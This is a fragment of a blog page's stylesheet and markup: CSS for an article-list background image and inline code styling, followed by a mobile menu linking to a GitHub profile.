    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("/img/article-list-bg.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
    .post .pjax article :not(pre) > code {
        color: #24292e;
        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
        background-color: rgba(27,31,35,.05);
        border-radius: 3px;
        font-size: 85%;
        margin: 0;
        padding: .2em .4em;
    }
    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
</div>


</html>
